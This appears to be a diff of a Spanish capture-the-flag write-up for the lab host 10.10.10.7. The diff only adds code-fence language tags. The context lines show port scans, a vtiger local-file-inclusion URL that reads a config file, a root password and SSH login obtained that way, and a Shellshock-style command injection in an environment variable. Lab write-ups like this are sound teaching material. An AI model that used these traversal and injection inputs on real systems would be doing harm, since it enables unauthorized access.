@@ -8,7 +8,7 @@
 
 vamos a realizar un escaneo con nmap:
 
-```
+```bash
 nmap -p- --open -T5 -v -n 10.10.10.7 -oG allPorts
 ```
 
@@ -18,13 +18,13 @@ La salida nos muesta los puertos 22,25,80,110,111,143,443,879,993,995,3306,4190,
 
 Vamos a realizar una enumeracion de los servicios en los puertos:
 
-```
+```bash
 nmap -p22,25,80,110,111,143,443,879,993,995,3306,4190,4445,4559,5038,10000 -sV -sC 10.10.10.7 -oN targeted
 ```
 
 y esta es la salida:
 
-```
+```bash
 # Nmap 7.91 scan initiated Mon Jul 19 10:20:37 2021 as: nmap -p22,25,80
        │  targeted 10.10.10.7
    2   │ Nmap scan report for 10.10.10.7
@@ -115,7 +115,7 @@ si examinamos el exploit de local file inclusion se una ruta que podemos probar:
 
 colocamos esa ruta junto a la direccion IP en el navegador:
 
-```
+```html
 https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
 ```
 
@@ -132,7 +132,7 @@ podemos leer diferentes archivos con el LFI y se tiene 2 usuarios potenciales do
 user: root
 pass: jEhdIekWmdjE
 
-```
+```bash
 ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7 
 ```
 
@@ -162,7 +162,7 @@ Estos archivos interactuan con una bash y si es una bash vulnerable es posible e
 
 La vulnerabilidad esta en la inyeccion de comandos en variables de entorno, sabemos podemos definir una variable de entorno de la siguiente manera:
 
-```
+```bash
 export SALUDO="hola mundo"
 
 echo $SALUDO #hola mundo
@@ -170,7 +170,7 @@ echo $SALUDO #hola mundo
 
 tambien es posible almacenar dentro de una variable de entorno una funcion escrita en bash que tiene la siguiente sintaxis:
 
-```
+```bash
 
 nombre_funcion(){contenido}
 
@@ -185,7 +185,7 @@ En este ejemplo no es necesario colocar un nombre de funcion y estamos escapando
 
 Sabemos que con **;** se puede concatenar comandos, que pasa si colocamos lo siguiente:
 
-```
+```bash
 export saludo="(){:;}; whoami"
 ```
 
